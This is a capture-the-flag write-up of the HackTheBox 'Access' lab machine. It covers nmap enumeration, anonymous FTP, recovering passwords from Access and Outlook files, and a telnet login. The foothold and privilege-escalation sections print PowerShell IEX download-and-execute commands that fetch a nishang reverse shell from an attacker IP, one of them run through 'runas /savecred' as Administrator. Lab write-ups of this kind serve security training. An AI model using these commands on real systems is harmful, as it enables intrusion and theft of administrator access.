---
title: "HackTheBox - Access"
author: Nasrallah
description: ""
date: 2023-03-25 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, easy, ftp]
img_path: /assets/img/hackthebox/machines/access
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Access](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

![](0.png)

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.98
Host is up (0.15s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: MegaCorp
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

We ftp with anonymous login enabled, telnet on port 23 and MS IIS http web server.

## Web

Let'a check the web page.

![](1.png)

Nothing really interesting, I done a directory scan and nothing came up.

## FTP

Let's login to the ftp server as anonymous

![](2.png)

We found two interesting files, `backup.mbd` and `Access Control.zip`.

The `.mdb` file is a Microsoft Access file, we can use a [MDBOpener.com](https://www.mdbopener.com/) to read it.

![](3.png)

Checking the different tables we find the `auth_user` table with some passwords.

![](4.png)

## Zip file

Let's unzip the zip file.

![](5.png)

We couldn't unzip using the tool `unzip` but `7z` came in clutch but asked us for a password.

Backup to the `auth_user` table we see the username `engineer` and this is the same name of the directory where we got the zip file from the ftp server, so we use `engineer`'s password to unzip the file.

After unzipping the file we got a file called `Access Control.pst` which is an Outlook file.

We can use an online [pst-viewer](https://goldfynch.com/pst-viewer/index.html) to read the file.

![](6.png)

# **Foothold**

We got credentials we user `security`, now let's use telnet to connect to the target.

![](7.png)

We got a shell but we can't even backspace, let's get another shell using `nishang powershelltcp.ps1`.

```shell
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.17.90/shell.ps1')"
```

![](9.png)

# **Privilege Escalation**

Checking public desktop we find the following.

![](8.png)

We found a `.lnk` file that's calling `runas` with `Administrator`, and it also used `savedcred` flag which means there are credentials cached for `Administrator`, we can confirm that by running `cmdkey /list` which show there is indeed Administrator cached creds.

Using the same technique we used to get a PS shell, we change the ip the nishang `.ps1` file, serve the file and setup a listener.

On the telnet shell we execute this command:

```shell
runas /user:ACCESS\Administrator /savecred "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.17.90/shell.ps1')"
```

![](10.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).